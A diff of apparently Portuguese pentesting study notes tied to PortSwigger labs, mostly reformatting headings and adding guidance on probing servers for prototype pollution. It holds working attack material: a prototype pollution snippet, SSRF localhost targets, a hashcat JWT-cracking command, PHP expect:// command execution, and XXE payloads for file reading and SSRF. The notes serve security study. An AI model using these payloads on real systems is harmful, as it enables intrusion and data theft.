@@ -9391,7 +9391,10 @@ LABS
 [Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
 
 
-Prototype Pollution
+- Prototype Pollution
+
+Pra saber se um servidor tem falha de prototype pollution, teste enviando dados com __proto__ ou constructor.prototype nos lugares onde o servidor recebe informações — como parâmetros da URL, corpo JSON de uma requisição ou até cabeçalhos. Se depois disso o servidor começar a se comportar de forma estranha, retornar propriedades que você injetou ou der erro, é sinal de que pode estar vulnerável. A falha aparece quando o servidor usa funções perigosas que misturam objetos sem cuidado, como merge() ou cloneDeep() em versões antigas de bibliotecas JavaScript.
+
 
 	a = 1
 	a.constructor.___proto___.bang=()=>[console.log("BOOM")]
@@ -9460,7 +9463,8 @@ LABS
 [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
 
 
-SSRF - Server-Side Request Forgery
+- SSRF - Server-Side Request Forgery
+
 Este tipo de ataque pode ser identificado fazendo testes e, `/file=` `/path=` `/src=` `imhURL` `ExportPDF` `Ler conteudos de outros sites`
 
 	[http://127.0.0.1:port ](http://127.0.0.1:port
@@ -9496,11 +9500,8 @@ LABS
 
 [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
 
+- JWT
 
-PHP TYPE JUGGLING
-Não foi explicado nem mostrado em LAB
-
-JWT
 Avaliar a assinatura se permite colocar como `none` se consegue quebrar o token e até mesmo realiza bruteforce. JWT sempre começa com `ey`
 
 	hashcat -a -0 -m 16500 TOKEN-JWT rockyou.txt
@@ -9526,21 +9527,23 @@ LABS
 
 [JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
 
-PHP WRAPPERS
+- PHP WRAPPERS
+
 Usado como recurso do PHP mas pode ser utilizado para ataques
-file:// - Acessar o File System
-http:// - Acessar HTTP(s) URLs
-ftp:// - Acessar FTP(s) URLs
-php:// - Acessar various I/O streams
-zlib:// - Compression Streams
-data:// - Data (RFC 2397)
-glob:// - Find pathnames matching pattern
-phar:// - PHP Archive
-ssh2:// - Secure Shell 2
-rar:// - RAR
-ogg:// - Audio streams
-expect:// - Process Interaction Streams
-filter:// - Codificar um arquivo (Base64, ROT13)
+	
+	file:// - Acessar o File System
+	http:// - Acessar HTTP(s) URLs
+	ftp:// - Acessar FTP(s) URLs
+	php:// - Acessar various I/O streams
+	zlib:// - Compression Streams
+	data:// - Data (RFC 2397)
+	glob:// - Find pathnames matching pattern
+	phar:// - PHP Archive
+	ssh2:// - Secure Shell 2
+	rar:// - RAR
+	ogg:// - Audio streams
+	expect:// - Process Interaction Streams
+	filter:// - Codificar um arquivo (Base64, ROT13)
 
 base64
 
@@ -9563,7 +9566,7 @@ Este não é instalado por padrão, mas se presente permite rodar comandos
 
 	expect://<comando>
 
-XXE PAYLOADS
+- XXE PAYLOADS
 
 File Inclusion
 
@@ -9575,11 +9578,11 @@ File Inclusion
 
 Bypass de Controle de Acesso
 
-
 	<?xml version="1.0"?>
 	<!DOCTYPE foo [
 	<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
 	<foo>&ac;</foo>
+
 XXE com SSRF
 
 	<?xml version="1.0"?>
